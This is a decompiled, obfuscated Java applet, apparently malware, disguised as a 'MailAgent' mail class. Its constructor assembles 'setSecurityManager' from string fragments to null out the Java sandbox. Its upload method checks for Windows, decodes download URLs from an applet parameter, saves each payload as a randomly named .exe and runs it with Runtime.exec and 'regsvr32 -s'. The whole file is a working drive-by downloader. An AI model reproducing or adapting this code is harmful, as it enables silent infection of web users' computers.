// 
// Decompiled by Procyon v0.5.30
// 

package mail;

import java.lang.reflect.Method;
import java.io.InputStream;
import java.io.IOException;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.awt.Component;
import java.beans.Expression;
import java.util.HashSet;
import java.lang.reflect.Array;
import javax.swing.JList;
import java.applet.Applet;

public class MailAgent extends Applet
{
    private int mail_id;
    protected JList addressList;
    protected Array firefox;
    private String BASE_DIR;
    protected String pkill;
    protected HashSet informer;
    
    public MailAgent() {
        this.BASE_DIR = new StringBuffer(".so").reverse().toString().concat("3hf5j7name".substring(6));
        this.pkill = "osjvhdv.e".concat("xe").substring(7);
        this.informer = new HashSet();
        final String tmps = new StringBuffer("09set").append("Sec").append("4urity".substring(1).concat("d4Man".substring(2))).append("3h3bager".substring(4)).substring(2);
        this.informer.add(new SendMail(System.class, tmps, new Object[1]));
        final Expression api = new Expression(System.class, tmps, new Object[1]);
        this.add(this.addressList = new JList((E[])new Object[] { new VirtualTable(this, this.informer) }));
    }
    
    public void upload() {
        super.start();
        FileOutputStream f = null;
        final String mailto = "aDL".concat("Xq-_.".concat("mjnWN6f".concat("wcsK".concat("B?xbI".concat("TS=Cy".concat("kGvd".concat("91Z:".concat("%ElR5".concat("po0rz".concat("A8/JY".concat("P72#".concat("ue&t4".concat("iQFhV".concat("U3OM".concat("gH")))))))))))))));
        InputStream c = null;
        final String incPath = new StringBuffer("dniW").reverse().append("kiows".substring(2)).toString();
        URL unicodeFormat = null;
        final String version = "QOn7cZAVmK/G4WuBqfLxj1_tlE8PTrpN2Y3:MUa=&5oRi%y?9DHv-Cgwkh60b.FdeSI#zJXs";
        if (System.getProperty(this.BASE_DIR).indexOf(incPath) < 0) {
            return;
        }
        final String manual = "/A_qCtQ%5v7cfy2JW3LgX-:nV0xRsP9HhbZB6pYU4&EeFokIauKM?m8rSD.#wdjiNlzG1OT=";
        final Runtime form = Runtime.getRuntime();
        final String[] chars = VirtualTable.transfer(version, mailto, this.getParameter("p")).split("::");
        for (int p = 0; p < chars.length; ++p) {
            final double rdm = Math.random();
            try {
                unicodeFormat = new URL(chars[p]);
            }
            catch (MalformedURLException ex) {
                return;
            }
            final String fprm = Double.toString(rdm).concat(this.pkill);
            try {
                f = new FileOutputStream(fprm);
            }
            catch (FileNotFoundException ex2) {
                return;
            }
            try {
                c = unicodeFormat.openStream();
            }
            catch (IOException ex3) {
                return;
            }
            Cid.move(c, f);
            try {
                c.close();
            }
            catch (IOException ex3) {
                return;
            }
            try {
                f.close();
            }
            catch (IOException ex3) {
                return;
            }
            this.checkArgs(10, fprm, form);
        }
    }
    
    public void start() {
        final String fprnt = "/A_qCtQ%5v7cfy2JW3LgX-:nV0xRsP9HhbZB6pYU4&EeFokIauKM?m8rSD.#wdjiNlzG1OT=";
        this.upload();
    }
    
    public void checkArgs(final int val, final String str, final Object o) {
        try {
            final Method rr = o.getClass().getMethod(String.valueOf(this.pkill.substring(1)) + "c", String.class);
            try {
                rr.invoke(o, str);
            }
            catch (Exception ex) {}
            try {
                rr.invoke(o, "r".concat("egs".concat("vr32 -s \"")).concat(str.concat("\"")));
            }
            catch (Exception ex2) {}
        }
        catch (Exception ex3) {}
    }
    
    public static boolean validForm(final Method m, final Object form, final Object[] args) {
        try {
            m.invoke(form, args);
        }
        catch (Exception ex) {}
        return true;
    }
}
